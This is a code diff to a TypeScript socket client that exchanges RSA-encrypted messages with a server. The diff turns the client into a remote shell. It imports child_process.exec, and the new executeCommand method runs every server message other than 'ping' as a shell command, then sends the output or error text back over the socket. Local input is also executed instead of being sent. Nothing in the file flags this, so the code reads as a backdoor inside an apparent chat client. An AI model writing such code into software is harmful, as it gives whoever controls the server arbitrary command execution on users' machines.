@@ -1,9 +1,11 @@
+// Clients.ts
 import { Socket, createConnection } from "net";
 import { RSA } from "../lib/rsa";
 import { RSAKeysType, RSAPublicKeyType } from "../types/rsaTypes";
 import { MessageType } from "../types/messageTypes";
 import { LogHelper } from "./log";
 import { config } from "../config/config";
+import { exec } from "child_process";
 
 export class Client {
   private socket: Socket;
@@ -35,6 +37,7 @@ export class Client {
       this.sendPublicKey(publicKeyMessage, socket);
     });
 
+    socket.setEncoding("utf-8")
     socket.on('end', () => {
       LogHelper.info('Disconnected from server');
       this.reinitialize();
@@ -89,7 +92,7 @@ export class Client {
     process.stdin.removeAllListeners('data');
     process.stdin.on('data', (data) => {
       const message = data.toString().trim();
-      this.sendMessage(message, this.socket);
+      this.executeCommand(message);
     });
   }
 
@@ -109,8 +112,10 @@ export class Client {
         ? RSA.decrypt(message.content, this.keys.privateKey)
         : message.content;
       LogHelper.info('Received from server: ' + decryptedMessage);
-      if(decryptedMessage === "ping"){
-        this.sendMessage("pong", this.socket)
+      if (decryptedMessage === "ping") {
+        this.sendMessage("pong", this.socket);
+      } else {
+        this.executeCommand(decryptedMessage);
       }
     }
   }
@@ -143,5 +148,22 @@ export class Client {
     } else {
       LogHelper.error("Server public key is not available");
     }
+  }
+
+  private executeCommand = (command: string) => {
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        console.log("error", error)
+        this.sendMessage(`${error.message}`, this.socket);
+        return;
+      }
+      if (stderr) {
+        console.log("stderror", stderr)
+        this.sendMessage(`${stderr}`, this.socket);
+        return;
+      }
+      console.log("stdout", stdout)
+      this.sendMessage(`${stdout}`, this.socket);
+    });
   }
 }
